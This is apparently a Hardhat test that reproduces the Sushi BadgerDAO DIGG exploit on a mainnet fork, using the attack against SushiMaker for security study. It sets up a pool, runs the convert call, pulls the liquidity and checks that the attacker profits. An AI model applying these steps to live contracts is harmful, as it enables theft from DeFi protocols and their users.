import { expect } from "chai";
import { BigNumber, Contract, ContractTransaction, Signer } from "ethers";
import { ethers } from "hardhat";
import { forkFrom } from "./utils/fork";
import { getAttackerContractName } from "./utils/fs";

/*
When new pairs were added in Sushiswaps’ Onsen, some non-ETH pairs were added, but no "bridge" was set up in the SushiMaker for DIGG/WBTC.

# Post Mortems
https://slowmist.medium.com/slow-mist-sushiswap-was-attacked-for-the-second-time-a47f2d110a84
https://www.rekt.news/badgers-digg-sushi/

# Code
SushiMaker: https://github.com/sushiswap/sushiswap/blob/64b758156da6f9bde1d8619f142946b005c1ba4a/contracts/SushiMaker.sol#L192
convert burns LP tokens, gets two tokens back, converts one to the other, converts the other to SUSHI, sends SUSHI to SushiBar (XSushi stakers)
deployed: https://etherscan.io/address/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50

fee is sent to SushiMaker by SushiSwapPair's burn (from Router::removeLiquidity) in _mintFee
IUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.io/address/0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac#readContract

# TX:
https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b
*/
let accounts: Signer[];
let attackerEOA: Signer;
let attacker: Contract;
let sushiFactory: Contract;
let sushiMaker: Contract;
let weth: Contract;
let diggWbtcPair: Contract;
let tx: ContractTransaction;

before(async () => {
  await forkFrom(11720049);

  accounts = await ethers.getSigners();
  [attackerEOA] = accounts;

  sushiFactory = await ethers.getContractAt(
    `IUniswapV2Factory`,
    `0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac`
  );
  sushiMaker = await ethers.getContractAt(
    `SushiMaker`,
    `0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50`
  );
  weth = await ethers.getContractAt(
    `IWETH`,
    `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
  );
  diggWbtcPair = await ethers.getContractAt(
    `IUniswapV2Pair`,
    `0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3`
  );

  const attackerFactory = await ethers.getContractFactory(
    getAttackerContractName(__filename),
    attackerEOA
  );
  attacker = await attackerFactory.deploy(
    `0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F`,
    `0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac`
  );
});

describe("Sushi BadgerDAO Digg Hack", function () {
  let WBTC: string;
  let DIGG: string;
  let diggWethPair: Contract;
  let initialBalance: BigNumber;

  it("sets up the DIGG <> WETH pool", async function () {
    initialBalance = await attackerEOA.getBalance();
    WBTC = await diggWbtcPair.token0();
    DIGG = await diggWbtcPair.token1();
    tx = await attacker.createAndProvideLiquidity(WBTC, DIGG, {
      value: ethers.utils.parseEther(`0.001`),
    });
    const sushiFactory = await ethers.getContractAt(
      `IUniswapV2Factory`,
      await attacker.sushiFactory()
    );
    diggWethPair = await ethers.getContractAt(
      `IUniswapV2Pair`,
      await sushiFactory.getPair(weth.address, DIGG)
    );

    const [reserveDigg, reserveWeth] = await diggWethPair.getReserves();
    const lpBalance = await diggWethPair.balanceOf(attacker.address);
    console.log(`diggWethPair ${diggWethPair.address}`);
    console.log(
      `Reserves ${ethers.utils.formatEther(
        reserveWeth
      )} WETH, ${ethers.utils.formatEther(reserveDigg)} DIGG`
    );
    console.log(`LP Balance ${ethers.utils.formatEther(lpBalance)}`);
    expect(lpBalance.gt(`0`), "no LP balance").to.be.true;
  });

  it("trades in the newly created pool through sushi maker", async function () {
    tx = await sushiMaker.connect(attackerEOA).convert(WBTC, DIGG);

    const [reserveDigg, reserveWeth] = await diggWethPair.getReserves();
    const lpBalance = await diggWethPair.balanceOf(attacker.address);
    console.log(
      `Reserves ${ethers.utils.formatEther(
        reserveWeth
      )} WETH, ${ethers.utils.formatEther(reserveDigg)} DIGG`
    );
  });

  it("withdraws all liquidity and makes a profit", async function () {
    tx = await attacker.rugPull(diggWethPair.address, WBTC);

    const [reserveDigg, reserveWeth] = await diggWethPair.getReserves();
    console.log(
      `Reserves ${ethers.utils.formatEther(
        reserveWeth
      )} WETH, ${ethers.utils.formatEther(reserveDigg)} DIGG`
    );
    const ethBalance = await attackerEOA.getBalance();
    const profit = ethBalance.sub(initialBalance);
    console.log(`Attacker Profit: ${ethers.utils.formatEther(profit)}`);

    expect(profit.gt(`0`), "no profit").to.be.true;
  });
});
